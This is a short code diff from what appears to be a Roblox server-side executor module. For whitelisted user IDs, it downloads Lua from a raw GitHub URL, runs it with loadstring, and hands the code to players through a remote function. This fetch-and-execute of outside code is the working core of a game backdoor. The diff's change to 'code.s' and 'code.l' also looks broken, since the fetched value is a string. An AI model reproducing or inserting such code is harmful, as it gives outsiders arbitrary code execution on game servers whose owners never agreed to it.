@@ -318,7 +318,7 @@ function module:givegui(player)
   if not player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
     local gui = module:createGUI(player)
     local code =  game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/s.lua", true)
-    local s = table.concat(string.split(code, [[\]]), "")
+    local s = table.concat(string.split(code.s, [[\]]), "")
     local serverscripts = loadstring(s)()
 
     serverscripts:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
@@ -335,7 +335,7 @@ end)
 game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
   if table.find(module.whitelist, plr.UserId) then
     local code =  game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua", true)
-    local s = table.concat(string.split(code, [[\]]), "")
+    local s = table.concat(string.split(code.l, [[\]]), "")
 
     return s
   end
